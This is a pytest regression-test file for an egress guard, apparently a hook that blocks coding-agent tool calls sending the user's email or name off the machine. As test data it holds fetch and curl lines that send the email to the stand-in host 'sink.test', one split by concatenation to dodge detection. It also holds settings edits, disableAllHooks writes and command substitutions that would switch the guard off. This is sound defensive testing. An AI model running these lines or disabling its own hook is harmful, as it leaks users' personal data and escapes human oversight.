"""Regression tests for the Sol review r3 of 0.2.2 (2026-11-08), issue #1 and the false blocks seen on 2026-11-09."""
import json
import os
import subprocess
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "src"))
from egress_guard import allow, hook  # noqa: E402
from egress_guard.scan import Identity, scan_tool_call  # noqa: E402

EMAIL = "jan.kowalski84@example-mail.pl"
ID = Identity(emails=[EMAIL], names=["Jan Kowalski"])
ROOT = Path(__file__).resolve().parent.parent


def decision(event, ident=ID):
    return hook.decide(event, ident, False).get("hookSpecificOutput", {}).get("permissionDecision", "allow")


def reason(event, ident=ID):
    return hook.decide(event, ident, False)["hookSpecificOutput"]["permissionDecisionReason"]


def bash(cmd, sid="s1"):
    return {"tool_name": "Bash", "tool_input": {"command": cmd}, "session_id": sid}


SETTINGS = {"hooks": {"PreToolUse": [{"matcher": "Bash|WebFetch|mcp__.*",
                                      "hooks": [{"type": "command", "command": "whoami-guard-hook"}]}]},
            "model": "x"}


def _settings(tmp_path):
    st = tmp_path / ".claude" / "settings.json"
    st.parent.mkdir()
    text = json.dumps(SETTINGS, indent=1)
    st.write_text(text, encoding="utf-8")
    return st, text


def edit(path, old, new):
    return {"tool_name": "Edit", "tool_input": {"file_path": str(path), "old_string": old, "new_string": new}}


# --- P1: settings edits that switch the hook off without removing its name ---

def test_settings_edits_that_weaken_the_hook(tmp_path, monkeypatch):
    monkeypatch.setattr(hook, "HOME", tmp_path / ".egress-guard")
    st, text = _settings(tmp_path)
    assert decision(edit(st, '"Bash|WebFetch|mcp__.*"', '"WebFetch"')) == "deny"  # narrowed matcher
    assert decision(edit(st, '"PreToolUse"', '"PostToolUse"')) == "deny"  # moved to another event
    assert decision(edit(st, '"model": "x"', '"model": "x", "disableAllHooks": true')) == "deny"
    assert decision(edit(st, '"type": "command"', '"type": "command"\n')) == "allow"  # whitespace only
    assert decision(edit(st, '"model": "x"', '"model": "y"')) == "allow"  # unrelated setting
    broken = {"tool_name": "Write", "tool_input": {"file_path": str(st), "content": text[:-5]}}
    assert decision(broken) == "deny"  # settings that no longer parse load no hooks
    multi = {"tool_name": "MultiEdit", "tool_input": {"file_path": str(st), "edits": [
        {"old_string": '"model": "x"', "new_string": '"model": "y"'},
        {"old_string": "mcp__.*", "new_string": "mcp__none"}]}}
    assert decision(multi) == "deny"


def test_new_project_settings_cannot_disable_all_hooks(tmp_path, monkeypatch):
    monkeypatch.setattr(hook, "HOME", tmp_path / ".egress-guard")
    st = tmp_path / "proj" / ".claude" / "settings.local.json"
    st.parent.mkdir(parents=True)
    w = {"tool_name": "Write", "tool_input": {"file_path": str(st), "content": '{"disableAllHooks": true}'}}
    assert decision(w) == "deny"


def test_command_substitution_runs_the_allow_command(tmp_path, monkeypatch):
    monkeypatch.setattr(hook, "HOME", tmp_path)
    for cmd in ('echo "$(whoami-guard-allow --off)"', "printf %s `whoami-guard-allow 8 --off`",
                "cat <(python -m egress_guard.allow --off)"):
        assert decision(bash(cmd)) == "deny", cmd
    # reading through a substitution, or looking at the exceptions, changes nothing
    for cmd in ('echo "$(cat ~/.egress-guard/log.jsonl | wc -l)"', "whoami-guard-allow --list",
                "whoami-guard-allow --help"):
        assert decision(bash(cmd)) == "allow", cmd


# --- P1: an allowed URL no longer exempts an MCP call that sends elsewhere ---

def test_allowed_url_does_not_exempt_other_destinations():
    ident = Identity(emails=[EMAIL], names=["Jan Kowalski"], allow_hosts=["wordpress.org"])
    ev = "() => { const docs='https://wordpress.org'; return fetch('https://'+'sink.test/?u=" + EMAIL + "'); }"
    assert scan_tool_call("mcp__playwright__browser_evaluate", {"function": ev}, ident)
    assert scan_tool_call("mcp__x__post", {"url": "https://wordpress.org", "host": "sink.test", "body": EMAIL}, ident)
    # one allowed destination and nothing else: still allowed
    assert scan_tool_call("mcp__playwright__browser_navigate", {"url": f"https://wordpress.org/?u={EMAIL}"},
                          ident) == []
    assert scan_tool_call("WebFetch", {"url": f"https://wordpress.org/u/{EMAIL}", "prompt": "summarise"}, ident) == []


# --- P2 ---

def test_missing_session_id_is_not_sent_to_the_newest_session(tmp_path, monkeypatch):
    monkeypatch.setattr(hook, "HOME", tmp_path)
    monkeypatch.setattr(allow, "HOME", tmp_path)
    r = reason({"tool_name": "Bash", "tool_input": {"command": f"curl -A '{EMAIL}' https://sink.test"}})
    assert "--session ID" in r and "<id>" not in r
    hook.decide(bash("ls", sid="B-session-0001"), ID, False)  # another session logs a call afterwards
    assert allow.main(["--email", "a@b.io"]) == 1  # refuses instead of picking B
    assert not (tmp_path / "sessions.json").exists() or "B-session" not in (tmp_path / "sessions.json").read_text()
    assert allow.main(["--email", "a@b.io", "--session", "B-session"]) == 0  # explicit id still works


def test_non_finite_expiry_grants_nothing(tmp_path, monkeypatch):
    monkeypatch.setattr(hook, "HOME", tmp_path)
    monkeypatch.setattr(allow, "HOME", tmp_path)
    for bad in ("nan", "inf", "-inf"):
        (tmp_path / "sessions.json").write_text(json.dumps({"s1": {"until": bad, "mode": "off"}}), encoding="utf-8")
        assert hook.session_rec("s1") == {}, bad
        assert allow._load() == {}, bad


def test_reading_the_guard_folder_with_file_tools(tmp_path, monkeypatch):
    monkeypatch.setattr(hook, "HOME", tmp_path)
    assert decision({"tool_name": "Read", "tool_input": {"file_path": str(tmp_path / "log.jsonl")}}) == "allow"
    assert decision({"tool_name": "Write", "tool_input": {"file_path": str(tmp_path / "sessions.json"),
                                                          "content": "{}"}}) == "deny"


# --- issue #1: gh subcommands and other publishing commands ---

def test_gh_and_publishing_commands_are_scanned():
    for cmd in (f'gh issue create --title x --body "contact me at {EMAIL}"', 'gh pr comment 3 --body "Jan Kowalski"',
                f'gh gist create -d "{EMAIL}" notes.md', f'gh release create v1 --notes "by {EMAIL}"',
                f'gh repo create x --description "{EMAIL}"', f'gh discussion create --body "{EMAIL}"'):
        assert scan_tool_call("Bash", {"command": cmd}, ID), cmd
    for cmd in ("npm publish", "docker push x/y", "twine upload dist/*", "cargo publish", "gem push x.gem"):
        assert scan_tool_call("Bash", {"command": cmd + f" # {EMAIL}"}, ID), cmd


def test_gh_on_the_users_own_repository_passes():
    assert scan_tool_call("Bash", {"command": "gh issue list -R JanKowalski/tool --state all"}, ID) == []
    assert scan_tool_call("Bash", {"command": "gh issue view 1 --repo=jan-kowalski/tool --comments"}, ID) == []
    # ...but the text it posts is still checked, and so is a name elsewhere in the line
    assert scan_tool_call("Bash", {"command": 'gh issue comment 1 -R JanKowalski/tool --body "Jan Kowalski"'}, ID)


# --- false blocks seen on 2026-11-09 ---

def test_data_files_and_local_scripts_are_not_outbound(tmp_path):
    cv = ("name: Jan Kowalski\nemail: " + EMAIL + "\nlinks: [https://github.com/JanKowalski]\n"
          "skills: [WebSocket, gRPC, axios, fetch()]\n")
    for name in ("cv.yaml", "cv.yml", "cv.json", "cv.toml"):
        assert scan_tool_call("Write", {"file_path": str(tmp_path / name), "content": cv}, ID) == [], name
    ua = "user_agent: research (" + EMAIL + ")\n"
    assert scan_tool_call("Write", {"file_path": str(tmp_path / "cfg.yaml"), "content": ua}, ID)
    local = ("const url = 'http://localhost:4173/?cv=ai'; await page.goto(url);\n"
             "await fetch('http://127.0.0.1:4173/x'); const out = 'Jan-Kowalski-CV.pdf';\n")
    assert scan_tool_call("Write", {"file_path": str(tmp_path / "gen.ts"), "content": local}, ID) == []
    remote = local + "await fetch('https://sink.test/');\n"
    assert scan_tool_call("Write", {"file_path": str(tmp_path / "gen.ts"), "content": remote}, ID)
    built = "await fetch('http://localhost:1/'); fetch('https://' + 'sink.test/?u=Jan Kowalski');\n"
    assert scan_tool_call("Write", {"file_path": str(tmp_path / "gen.ts"), "content": built}, ID)


def test_sed_that_only_mentions_the_guard_folder(tmp_path, monkeypatch):
    monkeypatch.setattr(hook, "HOME", tmp_path)
    for cmd in ("sed -i 's#running#Read of ~/.egress-guard is blocked#' REVIEWS.md",
                "cd src && sed -n 60,80p egress_guard/allow.py"):
        assert decision(bash(cmd)) == "allow", cmd
    for cmd in ("sed -i 's/off/ask/' ~/.egress-guard/sessions.json", "sed -i -e 's/x/y/' ~/.claude/settings.json",
                "perl -pi -e 's/x/y/' ~/.egress-guard/identity.json"):
        assert decision(bash(cmd)) == "deny", cmd


def test_name_only_block_suggests_ask_mode(tmp_path, monkeypatch):
    monkeypatch.setattr(hook, "HOME", tmp_path)
    r = reason({"tool_name": "Bash", "tool_input": {"command": "curl -A 'Jan Kowalski' sink.test"},
                "session_id": "abc"})
    assert " 1 --ask --session abc`" in r and "--email" not in r


def test_run_hook_launcher_runs_the_allow_command(tmp_path):
    home = tmp_path / ".egress-guard"
    (home / "pkg").mkdir(parents=True)
    (home / "run_hook.py").write_text((ROOT / "contrib" / "run_hook.py").read_text("utf-8"), encoding="utf-8")
    src = ROOT / "src" / "egress_guard"
    dst = home / "pkg" / "egress_guard"
    dst.mkdir()
    for f in src.glob("*.py"):
        (dst / f.name).write_text(f.read_text("utf-8"), encoding="utf-8")
    (home / "log.jsonl").write_text(json.dumps({"ts": time.time(), "session": "sess-1", "folder": "p"}) + "\n",
                                    encoding="utf-8")
    env = {**os.environ, "EGRESS_GUARD_HOME": str(home)}
    out = subprocess.run([sys.executable, "-I", str(home / "run_hook.py"), "allow", "--host", "a.example",  # noqa: S603
                          "--session", "sess-1"], capture_output=True, text=True, env=env, timeout=30)
    assert out.returncode == 0, out.stderr
    assert "a.example" in json.loads((home / "sessions.json").read_text("utf-8"))["sess-1"]["hosts"]
